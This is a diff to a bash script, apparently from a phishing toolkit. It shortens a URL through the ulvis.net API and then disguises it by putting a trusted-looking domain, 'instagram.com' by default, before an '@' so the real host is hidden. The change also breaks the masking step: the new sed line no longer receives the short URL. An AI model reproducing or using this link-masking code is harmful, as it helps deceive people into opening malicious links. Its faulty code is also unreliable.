@@ -187,8 +187,9 @@ mask_url() {
     read -r custom_domain
     custom_domain=${custom_domain:-"instagram.com"}
 
-    local masked_url=$(echo "$short_url" | sed "s|//|://${custom_domain}@|")
-   
+    local masked_url=$(sed "s|//|://${custom_domain}@|")
+    echo -e "\n${GREEN} [ + ] URL masking...${RESET}\n"
+
     echo -e "${YELLOW} \n   Masked url: "
     echo -e "------------------------------------------------"
     echo -e "${GREEN} [ + ] ${masked_url}${YELLOW}"
@@ -196,11 +197,11 @@ mask_url() {
 }
 
 short_url() {
+    echo -e "\n${GREEN} [ + ] URL shortening...${RESET}\n"
     local long_url="$1"
     local api_endpoint="https://ulvis.net/API/write/post"
     
     local response=$(curl -s -X POST -d "url=$long_url" "$api_endpoint" 2>/dev/null)
-    
     if echo "$response" | jq -e '.success' >/dev/null 2>&1; then
         echo "$(echo "$response" | jq -r '.data.url')"
     else
